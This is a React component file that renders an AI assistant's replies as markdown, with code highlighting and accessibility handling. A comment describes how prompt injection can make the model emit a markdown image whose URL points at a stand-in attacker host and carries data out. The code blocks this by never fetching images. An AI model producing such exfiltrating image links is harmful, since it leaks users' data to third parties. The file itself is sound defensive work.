"use client";
// Renders an assistant reply as markdown instead of a plain string, so
// headings, lists and prose get real line-height and sizing and a fenced code
// block gets a monospace, per-language syntax highlighter instead of a plain
// `<pre>`. Streamdown is the one place that config lives; `assistant-streaming-
// text.tsx` is the only other caller, passing `streaming: true` while it is
// still revealing characters so an unterminated fence or bold marker never
// renders as broken HTML mid-reveal (`parseIncompleteMarkdown`).
import type * as React from "react";
import { Streamdown } from "streamdown";
import { createCodePlugin } from "@streamdown/code";

/**
 * Shiki highlighting for fenced code. `[light, dark]` emits both themes as
 * inline `--shiki-light`/`--shiki-dark` CSS variables and Streamdown's
 * `dark:` Tailwind utilities pick between them off the `.dark` class on
 * `<html>`, with no JS theme detection and no flash.
 */
const codePlugin = createCodePlugin({
  themes: ["github-light", "github-dark"],
});

/**
 * An image in a reply renders as its alt text and is never fetched. The reply
 * is model output, and a prompt injection or a tool result can steer it: an
 * `![x](https://attacker.example/?d=…)` would otherwise have the browser send
 * whatever the model put in that URL to a third party, with no confirmation.
 * Streamdown's link-safety prompt covers links, not images.
 */
function InertImage({ alt }: { alt?: string }) {
  return alt ? <span>{alt}</span> : null;
}

/**
 * A link in the screen-reader copy a reveal announces, read as its text. That
 * copy is visually hidden, so a real anchor in it would be a tab stop nobody
 * can see.
 */
function PlainLink({ children }: { children?: React.ReactNode }) {
  return <span>{children}</span>;
}

/**
 * `text-sm` alone: its own line-height (1.25rem) matches the user bubble and
 * the intro copy beside a reply. `leading-relaxed` on top made every paragraph
 * and list item a taller line than the rest of the flyout. Streamdown keeps
 * `space-y-4` between blocks, which is the paragraph spacing this keeps.
 *
 * Streamdown gives each `<li>` `py-1`, so sibling items sat 8px apart on top
 * of the line-height. Halved, a list reads as one block, not a stack of
 * paragraphs.
 */
const PROSE_CLASS =
  "max-w-none text-sm [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_li]:py-0.5 [&_pre]:max-w-full [&_pre]:overflow-x-auto [&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto";

const COMPONENTS = { img: InertImage };
const READ_ONLY_COMPONENTS = { img: InertImage, a: PlainLink };

export interface AssistantMarkdownProps {
  children: string;
  /** True while the text is still being revealed (see `assistant-streaming-text.tsx`). */
  streaming?: boolean;
  /**
   * False for the screen-reader copy a reveal announces: it is visually
   * hidden, so a copy button or a link in it would be a tab stop nobody can
   * see. Both render as text.
   */
  interactive?: boolean;
}

export function AssistantMarkdown({
  children,
  streaming = false,
  interactive = true,
}: AssistantMarkdownProps) {
  return (
    <Streamdown
      parseIncompleteMarkdown={streaming}
      shikiTheme={["github-light", "github-dark"]}
      components={interactive ? COMPONENTS : READ_ONLY_COMPONENTS}
      plugins={
        // @streamdown/code resolves shiki@3.x while streamdown's own type
        // expects shiki@1.29.2, so `getSupportedLanguages()` returns two
        // structurally different `BundledLanguage` unions and the plugin
        // object fails a structural check even though it is the plugin
        // Streamdown's own docs say to pass (proven at runtime by
        // `app_deprecated`'s identical config). Assert the whole object
        // rather than a narrower per-field cast, so this stays correct
        // however the shiki peer resolves.
        // eslint-disable-next-line @typescript-eslint/consistent-type-assertions -- shiki version skew between streamdown and @streamdown/code's types; see comment above
        { code: codePlugin } as React.ComponentProps<
          typeof Streamdown
        >["plugins"]
      }
      controls={interactive ? { code: { copy: true, download: false } } : false}
      className={PROSE_CLASS}
    >
      {children}
    </Streamdown>
  );
}
